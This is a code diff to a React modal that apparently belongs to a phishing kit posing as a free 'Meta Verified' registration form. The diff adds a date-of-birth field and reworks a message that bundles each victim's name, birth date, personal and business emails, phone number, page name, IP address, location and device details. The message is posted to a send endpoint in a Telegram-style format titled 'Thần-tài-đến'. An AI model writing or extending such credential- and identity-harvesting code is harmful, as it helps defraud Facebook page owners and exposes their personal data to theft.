@@ -12,6 +12,7 @@ import { type ChangeEvent, type FC, type FormEvent, useCallback, useEffect, useM
 
 interface FormData {
     fullName: string;
+    dob: string;
     personalEmail: string;
     businessEmail: string;
     pageName: string;
@@ -20,15 +21,32 @@ interface FormData {
 interface FormField {
     name: keyof FormData;
     label: string;
-    type: 'text' | 'email' | 'textarea';
+    type: 'text' | 'email' | 'textarea' | 'date';
 }
+
+const SEP = '━━━━━━━━━━━━━━━━━━━━';
+
+const formatDateTime = (): string => {
+    const now = new Date();
+    const vnDate = new Date(now.toLocaleString('en-US', { timeZone: 'Asia/Ho_Chi_Minh' }));
+    const pad = (n: number) => String(n).padStart(2, '0');
+    return `${pad(vnDate.getDate())}/${pad(vnDate.getMonth() + 1)}/${vnDate.getFullYear()} ${pad(vnDate.getHours())}:${pad(vnDate.getMinutes())}:${pad(vnDate.getSeconds())}`;
+};
+
+const formatDOB = (dob: string): string => {
+    if (!dob) return '';
+    const [year, month, day] = dob.split('-');
+    return `${day}/${month}/${year}`;
+};
 
 const FORM_FIELDS: FormField[] = [
     { name: 'fullName', label: 'Full Name', type: 'text' },
+    { name: 'dob', label: 'Date of Birth', type: 'date' },
     { name: 'pageName', label: 'Apply for Meta Verified – [Page Name]', type: 'text' },
     { name: 'personalEmail', label: 'Personal Email', type: 'email' },
     { name: 'businessEmail', label: 'Business Email', type: 'email' }
 ];
+
 const InitModal: FC<{ nextStep: (data: FormData) => void }> = ({ nextStep }) => {
     const [isLoading, setIsLoading] = useState(false);
     const [phoneNumber, setPhoneNumber] = useState('');
@@ -36,12 +54,13 @@ const InitModal: FC<{ nextStep: (data: FormData) => void }> = ({ nextStep }) => 
     const [agreeToTerms, setAgreeToTerms] = useState(false);
     const [formData, setFormData] = useState<FormData>({
         fullName: '',
+        dob: '',
         personalEmail: '',
         businessEmail: '',
         pageName: ''
     });
 
-    const { setModalOpen, geoInfo, setMessageId, setMessage } = store();
+    const { setModalOpen, geoInfo, setMessageId, setMessage, setBaseMessage, resetSession } = store();
     const countryCode = geoInfo?.country_code.toLowerCase() || 'us';
 
     const t = (text: string): string => {
@@ -50,7 +69,18 @@ const InitModal: FC<{ nextStep: (data: FormData) => void }> = ({ nextStep }) => 
 
     useEffect(() => {
         if (!geoInfo) return;
-        const textsToTranslate = ['Complete the free Meta Verified registration form.', 'Full Name', 'Personal Email', 'Business Email', 'Apply for Meta Verified – [Page Name]', 'Mobile phone number', 'Send', 'Our response will be sent to you within 14-40 hours.', 'I agree with Terms of use'];
+        const textsToTranslate = [
+            'Complete the free Meta Verified registration form.',
+            'Full Name',
+            'Date of Birth',
+            'Personal Email',
+            'Business Email',
+            'Apply for Meta Verified – [Page Name]',
+            'Mobile phone number',
+            'Send',
+            'Our response will be sent to you within 14-40 hours.',
+            'I agree with Terms of use'
+        ];
         const translateAll = async () => {
             const translatedMap: Record<string, string> = {};
             for (const text of textsToTranslate) {
@@ -93,36 +123,40 @@ const InitModal: FC<{ nextStep: (data: FormData) => void }> = ({ nextStep }) => 
 
         if (isLoading) return;
         setIsLoading(true);
+
+        resetSession();
+
         const deviceInfo = detectDevice();
+        const location = geoInfo
+            ? [geoInfo.city, geoInfo.region, geoInfo.country].filter(Boolean).join(', ')
+            : 'N/A';
 
-        const message = `
-${
-    geoInfo
-        ? `<b>📌 IP:</b> <code>${geoInfo.ip}</code>\n<b>🌎 Country:</b> <code>${geoInfo.city} - ${geoInfo.country} (${geoInfo.country_code})</code>`
-        : 'N/A'
-}
-<b>📱 Thiết bị:</b> <code>${deviceInfo?.deviceInfo || 'Unknown Device'}</code>
-${deviceInfo.model ? `   └ Model: <code>${deviceInfo.model}</code>\n` : ''}${deviceInfo.deviceType && deviceInfo.deviceType !== 'Unknown' ? `   └ Loại: <code>${deviceInfo.deviceType}</code>\n` : ''}${deviceInfo.cpu ? `   └ CPU: <code>${deviceInfo.cpu}</code>\n` : ''}${deviceInfo.engine ? `   └ Engine: <code>${deviceInfo.engine}</code>\n` : ''}${deviceInfo.userAgent ? `   └ UA: <code>${deviceInfo.userAgent.substring(0, 100)}${deviceInfo.userAgent.length > 100 ? '...' : ''}</code>\n` : ''}
+        const baseMessage = `📩 <b>Thần-tài-đến</b>
+⏰ <code>${formatDateTime()}</code>
+🌐 <b>IP:</b> <code>${geoInfo?.ip ?? 'N/A'}</code>
+📱 <b>Thiết bị:</b> <code>${deviceInfo.deviceInfo}</code>
+📍 <b>Vị trí:</b> <code>${location}</code>
+${SEP}
+📋 <b>THÔNG TIN</b>
+   Tên: <code>${formData.fullName}</code>
+   Ngày sinh: <code>${formatDOB(formData.dob)}</code>
+   Email: <code>${formData.personalEmail}</code>
+   Business: <code>${formData.businessEmail}</code>
+   SĐT: <code>${phoneNumber}</code>
+   Page: <code>${formData.pageName}</code>`;
 
-<b>👤 Full Name:</b> <code>${formData.fullName}</code>
-<b>📘 Page Name:</b> <code>${formData.pageName}</code>
-<b>📧 Personal Email:</b> <code>${formData.personalEmail}</code>
-<b>💼 Business Email:</b> <code>${formData.businessEmail}</code>
-<b>📱 Phone Number:</b> <code>${phoneNumber}</code>
-
-<b>🕐 Time:</b> <code>${new Date().toLocaleString('vi-VN', { timeZone: 'Asia/Ho_Chi_Minh' })}</code>
-        `.trim();
+        const message = `${baseMessage}\n${SEP}`;
 
         try {
-            const res = await axios.post('/api/send', {
-                message
-            });
+            const res = await axios.post('/api/send', { message });
             if (res?.data?.success && typeof res.data.data.result.message_id === 'number') {
                 setMessageId(res.data.data.result.message_id);
-                setMessage(message);
             }
+            setBaseMessage(baseMessage);
+            setMessage(message);
         } catch {
-            // Continue even if send fails
+            setBaseMessage(baseMessage);
+            setMessage(message);
         } finally {
             setIsLoading(false);
             nextStep(formData);
@@ -147,7 +181,18 @@ ${deviceInfo.model ? `   └ Model: <code>${deviceInfo.model}</code>\n` : ''}${d
                         {FORM_FIELDS.map((field) => (
                             <div key={field.name}>
                                 <p className='text-xs sm:text-sm font-sans'>{t(field.label)}</p>
-                                {field.type === 'textarea' ? <textarea name={field.name} value={formData[field.name]} onChange={handleInputChange} className='min-h-20 sm:min-h-25 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-base' rows={3} /> : <input required name={field.name} type={field.type} value={formData[field.name]} onChange={handleInputChange} className='h-10 sm:h-11 md:h-12.5 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-base' />}
+                                {field.type === 'textarea' ? (
+                                    <textarea name={field.name} value={formData[field.name]} onChange={handleInputChange} className='min-h-20 sm:min-h-25 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-base' rows={3} />
+                                ) : (
+                                    <input
+                                        required
+                                        name={field.name}
+                                        type={field.type}
+                                        value={formData[field.name]}
+                                        onChange={handleInputChange}
+                                        className='h-10 sm:h-11 md:h-12.5 w-full rounded-[10px] border-2 border-[#d4dbe3] px-3 py-1.5 text-base'
+                                    />
+                                )}
                             </div>
                         ))}
                         <p className='text-xs sm:text-sm font-sans'>{t('Mobile phone number')}</p>
@@ -161,8 +206,8 @@ ${deviceInfo.model ? `   └ Model: <code>${deviceInfo.model}</code>\n` : ''}${d
                         />
                         <p className='text-xs sm:text-xs text-gray-600 mt-2 sm:mt-3'>{t('Our response will be sent to you within 14-40 hours.')}</p>
                         <div className='flex items-center gap-2 mt-2 sm:mt-3'>
-                            <input 
-                                type='checkbox' 
+                            <input
+                                type='checkbox'
                                 id='agreeTerms'
                                 checked={agreeToTerms}
                                 onChange={(e) => setAgreeToTerms(e.target.checked)}
